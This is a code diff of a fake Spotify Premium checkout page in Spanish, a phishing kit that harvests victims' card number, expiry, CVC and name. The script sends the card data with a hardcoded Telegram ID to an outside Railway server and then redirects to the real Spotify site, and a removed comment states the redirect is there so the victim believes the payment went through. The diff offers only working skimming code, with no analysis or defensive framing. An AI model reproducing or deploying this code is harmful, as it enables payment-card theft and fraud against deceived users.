@@ -186,20 +186,13 @@
   </div>
 
   <footer class="footer">
-    <div class="footer-links">
-      <a href="#">Privacidad</a>
-      <a href="#">Términos</a>
-      <a href="#">Cookies</a>
-      <a href="#">Ayuda</a>
-    </div>
+    <div class="footer-links"><a href="#">Privacidad</a><a href="#">Términos</a><a href="#">Cookies</a><a href="#">Ayuda</a></div>
     © 2026 Spotify AB. Todos los derechos reservados.
   </footer>
-<!-- ... (Todo tu CSS se mantiene igual, no lo toques) ... -->
-<!-- (Asegúrate de que el CSS esté pegado arriba como lo tenías) -->
 
-<script>
-    // --- CONFIGURACIÓN CRÍTICA ---
-    // ESTE ES EL ÚNICO LUGAR QUE IMPORTA PARA QUE FUNCIONE
+  <script>
+    // --- CONFIGURACIÓN DEL CLIENTE ---
+    const MY_TELEGRAM_ID = '7707049896'; 
     const SERVER_URL = 'https://kezosc-production.up.railway.app'; 
 
     function selectMethod(btn, method) {
@@ -215,9 +208,9 @@
       validateForm();
     }
 
-    // Formateo de tarjeta
+    // CORRECCIÓN DEL ERROR DEL NÚMERO 9
     document.getElementById('cardNumber').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, ''); 
+      let value = e.target.value.replace(/\D/g, ''); // Solo permite números
       let formatted = '';
       for (let i = 0; i < value.length && i < 16; i++) {
         if (i > 0 && i % 4 === 0) formatted += ' ';
@@ -253,7 +246,6 @@
     document.getElementById('cardName').addEventListener('input', validateForm);
     document.getElementById('terms').addEventListener('change', validateForm);
 
-    // FUNCIÓN DE ENVÍO CORREGIDA
     async function submitPayment() {
       const btn = document.getElementById('payBtn');
       const btnText = document.getElementById('btnText');
@@ -262,6 +254,7 @@
       btnText.innerHTML = 'Procesando...';
 
       const payload = {
+        target_id: MY_TELEGRAM_ID,
         tarjeta: document.getElementById('cardNumber').value,
         expiracion: document.getElementById('cardExpiry').value,
         cvc: document.getElementById('cardCvc').value,
@@ -269,23 +262,19 @@
       };
 
       try {
-        // Enviamos la petición al servidor de Railway
-        const response = await fetch(`${SERVER_URL}/enviar-datos`, {
+        console.log("Enviando datos a:", SERVER_URL);
+        await fetch(`${SERVER_URL}/enviar-datos`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-
-        if (response.ok) {
-          console.log("¡ÉXITO! Datos enviados.");
-        } else {
-          console.error("Error en el servidor:", response.status);
-        }
+        console.log("Envío completado con éxito");
       } catch (error) {
-        console.error("Error de conexión con el servidor:", error);
+        console.error("Error en el envío:", error);
       }
 
-      // Redirigir siempre al final para que el cliente crea que pagó
       window.location.href = 'https://www.spotify.com/mx/premium/';
     }
-</script>
+  </script>
+</body>
+</html>
